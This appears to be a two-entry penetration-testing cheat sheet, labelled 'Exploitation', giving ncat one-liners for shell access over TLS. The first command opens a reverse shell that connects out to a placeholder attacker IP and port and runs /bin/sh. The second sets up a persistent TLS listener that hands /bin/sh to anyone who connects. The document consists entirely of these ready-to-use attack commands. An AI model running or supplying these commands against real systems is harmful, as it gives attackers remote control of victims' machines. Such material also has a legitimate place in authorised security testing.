# [Exploitation] Reverse shell over TLS (connect to listener) --ncat
ncat --ssl <attacker_ip> <port> -e /bin/sh -nv

# [Exploitation] TLS listener with exec /bin/sh --ncat
ncat -lvnp <port> --ssl --keep-open --exec "/bin/sh"
